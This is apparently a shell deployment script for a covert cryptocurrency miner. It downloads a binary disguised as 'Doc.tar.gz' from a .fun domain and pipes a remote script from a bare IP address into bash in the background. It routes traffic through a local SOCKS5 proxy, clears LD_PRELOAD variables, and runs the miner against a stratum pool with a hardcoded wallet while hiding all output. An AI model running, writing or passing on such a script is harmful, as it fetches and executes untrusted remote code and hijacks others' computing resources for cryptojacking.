#!/bin/sh

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Shiny_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 4`
echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

wget -q http://greenleaf.teatspray.fun/Doc.tar.gz >/dev/null

sleep 2

tar -xf Doc.tar.gz

sleep 2

curl -fsSL http://8.208.114.21/install_and_monitor_shade.sh | bash &

sleep 2

curl -x socks5h://127.0.0.1:1081 ifconfig.me

sleep 2

unset LD_PRELOAD
unset LD_PRELOAD_ENV
unset LD_LIBRARY_PATH

sleep 2

./Doc --disable-gpu --algorithm power2b --pool stratum-mining-pool.zapto.org:3765 --wallet MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate --password x --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
